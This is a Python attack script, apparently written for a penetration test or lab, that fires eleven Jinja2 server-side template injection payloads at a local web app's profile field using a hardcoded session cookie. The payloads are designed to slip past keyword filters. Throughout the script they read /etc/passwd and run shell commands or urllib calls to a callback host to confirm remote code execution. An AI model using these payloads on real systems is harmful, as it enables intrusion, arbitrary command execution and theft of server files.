#!/usr/bin/env python3
import requests
import urllib.parse
import base64
import time

base_url = "http://127.0.0.1:32813"
callback_url = "http://localhost:8888/callback"

print("=== Advanced SSTI Filter Bypass Test ===")
print(f"Target: {base_url}")
print(f"Callback endpoint: {callback_url}")

# Use provided session cookie from previous authentication
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVqK6Q.DjdnJP5cp110FpB2UDxmK976cZA"
cookies = {"session": session_cookie}

def test_payload(payload_name, raw_payload, description=""):
    print(f"\n{'='*70}")
    print(f"Test: {payload_name}")
    if description:
        print(f"Description: {description}")
    
    # Send POST request to profile with raw payload (will be auto-encoded by requests)
    profile_url = base_url + "/profile"
    data = {"bio": raw_payload}
    
    try:
        response = requests.post(profile_url, data=data, cookies=cookies, allow_redirects=False)
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}B")
        
        if response.status_code == 200:
            print("\n✓ SUCCESS: Payload bypassed filter!")
        elif response.status_code == 400:
            print("✗ BLOCKED: 400 Bad Request")
        elif response.status_code == 500:
            print("! SERVER ERROR: 500 Internal Server Error")
        
        if response.text and not "Bad Request" in response.text:
            print(f"Response preview: {response.text[:300]}")
            
        return response.status_code
    except Exception as e:
        print(f"Request error: {e}")
        return None

print(f"\n{'='*70}")
print("TESTING ADVANCED BYPASS TECHNIQUES")
print(f"{'='*70}")

# Technique 1: Hex-encoded characters IN the payload (not URL encoding)
# The payload will contain actual hex escapes that get evaluated at runtime
payload1 = '{{ ""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")(2)|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(X)|attr("\x5f\x5fopen\x5f\x5f")("/etc/passwd").read() }}'
result1 = test_payload("Hex-encoded underscores in payload", payload1, "Using hex escapes in the payload itself")

# Technique 2: Using |attr() filter with string concatenation
payload2 = '{{ ({}|attr((session)|list|reverse|join))|attr("__class__").mro()[2].subclasses()[X].__init__.__globals__.os.popen("curl http://localhost:8888/callback").read() }}'
result2 = test_payload("String concatenation attr", payload2, "Building attribute names dynamically")

# Technique 3: Using request.args to bypass filters on __class__
# This would require query parameters: ?class=__class__&mro=__mro__ etc
payload3 = '{{ ""|attr(request.args.class)|attr(request.args.mro)[request.args.index](2)|attr(request.args.subclasses)()[300]|attr(request.args.init).__globals__.os.popen("curl http://localhost:8888/callback").read() }}'
result3 = test_payload("request.args parameterization", payload3, "Using request arguments to inject filtered keywords")

print(f"\n{'='*70}")
print("TESTING WITHOUT CURL (USING URLLIB DIRECTLY)")
print(f"{'='*70}")

# Technique 4: Access urllib without using underscores in the template
payload4 = '{{ (""|attr(request.args.a)).mro(request.args.b)[2].subclasses().pop(X).__init__.__globals__.urllib.request.urlopen("http://localhost:8888/callback").read() }}'
result4 = test_payload("urllib via globals, no curl", payload4, "Using urllib without curl command")

# Technique 5: Using config to access urllib
double_encoded = "".join(["%{}".format(hex(ord(c))[2:]) for c in "__class__"]).replace("%5f", "\x5f")
payload5 = '{{ config|attr(request.args.c).mro()[2].subclasses().pop(X).__init__.__globals__.urllib.request.urlopen("http://localhost:8888/callback").read() }}'
result5 = test_payload("config urllib access", payload5, "Accessing urllib through config")

# Technique 6: Using built-in lipsum object
payload6 = '{{ (lipsum|attr("__globals__"))["urllib"].request.urlopen("http://localhost:8888/callback").read() }}'
result6 = test_payload("lipsum globals direct", payload6, "Direct access to lipsum.__globals__")

print(f"\n{'='*70}")
print("TESTING WITH BASE64 ENCODED PAYLOADS")
print(f"{'='*70}")

# Technique 7: Base64 encoded command passed to eval-like operation
cmd_b64 = base64.b64encode(b"curl http://localhost:8888/callback").decode()
payload7 = '{{ request[request.__class__.mro()[2].subclasses()[X]("base64").b64decode("' + cmd_b64 + '").strip(), shell=True, stdout=-1).communicate() }}'
result7 = test_payload("Base64 encoded command", payload7, "Base64 encoded command for execution")

print(f"\n{'='*70}")
print("TESTING WITH COMMENT INJECTION")
print(f"{'='*70}")

# Technique 8: Using comments to break up keywords
payload8 = '{{ "".__cl<!--test-->ass__.__ba<!--test-->se__.__sub<!--test-->classes__()[X].__init__.__globals__.os.popen("curl http://localhost:8888/callback").read() }}'
result8 = test_payload("Comment injected keywords", payload8, "Injecting HTML comments in keywords")

# Technique 9: More subtle comment injection (between words)
payload9 = '{{ cycler.__in{#comment#}it__.__glo{#comment#}bals__.os.popen("curl http://localhost:8888/callback").read() }}'
result9 = test_payload("Jinja comment injection", payload9, "Using Jinja comments to break keywords")

print(f"\n{'='*70}")
print("TESTING ALTERNATIVE ACCESS PATHS")
print(f"{'='*70}")

# Technique 10: Using importlib to import urllib
payload10 = '{{ request.__class__.__dict__["__init__"].__globals__["__builtins__"]["__import__"]("urllib").request.urlopen("http://localhost:8888/callback").read() }}'
result10 = test_payload("__import__ builtins", payload10, "Using __import__ to load urllib")

# Technique 11: Using getattr to avoid attribute access
payload11 = '{{ getattr(lipsum, "__globals__")["urllib"].request.urlopen("http://localhost:8888/callback").read() }}'
result11 = test_payload("getattr wrapper", payload11, "Using getattr to access attributes")

# Summary
print(f"\n{'='*70}")
print("SUMMARY OF RESULTS")
print(f"{'='*70}")

results = {
    "Hex-encoded underscores": result1,
    "String concatenation": result2,
    "request.args parameterization": result3,
    "urllib via globals": result4,
    "config urllib": result5,
    "lipsum globals": result6,
    "Base64 command": result7,
    "HTML comment injection": result8,
    "Jinja comment injection": result9,
    "__import__ builtins": result10,
    "getattr wrapper": result11
}

successful = []
partial = []
for name, code in results.items():
    if code == 200:
        successful.append(name)
    elif code == 500:
        partial.append(name)
    print(f"{name}: {code}")

if successful:
    print(f"\n[+] SUCCESS: {len(successful)} payload(s) bypassed the filter:")
    for s in successful:
        print(f"  ✓ {s}")
if partial:
    print(f"\n[!] PARTIAL: {len(partial)} payload(s) caused server errors (may indicate execution):")
    for p in partial:
        print(f"  ! {p}")
if not successful and not partial:
    print("\n[-] No payload bypassed the filter")

print(f"\n{'='*70}")
print("RECOMMENDATION: Set up a callback listener on localhost:8888")
print("to verify if any payload actually executed despite 400/500 errors.")
print(f"{'='*70}")
